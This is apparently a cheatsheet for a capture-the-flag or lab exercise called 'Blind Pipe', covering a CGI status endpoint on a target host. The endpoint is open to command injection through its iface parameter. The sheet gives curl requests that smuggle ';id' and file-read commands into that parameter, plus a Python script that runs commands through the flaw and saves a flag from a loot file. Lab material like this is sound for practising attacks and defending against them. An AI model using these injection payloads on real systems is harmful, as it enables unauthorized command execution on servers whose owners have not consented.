# Cheatsheet — Blind Pipe

## Targets

- **web01** — apache + `/cgi-bin/status?iface=<name>` on :80

## Useful commands

```bash
curl -s 'http://<ip>/cgi-bin/status?iface=lo'
curl -s 'http://<ip>/cgi-bin/status?iface=lo%3Bid'      # ;id
curl -s 'http://<ip>/cgi-bin/status?iface=lo%3Bcat%20/etc/hostname'
```

## Script sketch

```python
import requests, re
B = "http://<ip>/cgi-bin/status"
def run(cmd):
    r = requests.get(B, params={"iface": f"lo;{cmd}"})
    return r.text.split("== iface")[-1]
print(run("id"))
loot = run("cat /home/wwwops/loot.txt")
m = re.search(r"pentrAIn\\{[^}]*\\}", loot)
open("/root/loot.txt","w").write(m.group(0))
```

## Concepts

- `params=` url-encodes for you — no manual `%3B` juggling
- The vulnerable shape is `bash -c "... $VAR"` — quote yourself out
- Script the whole chain: probe → inject → parse → save
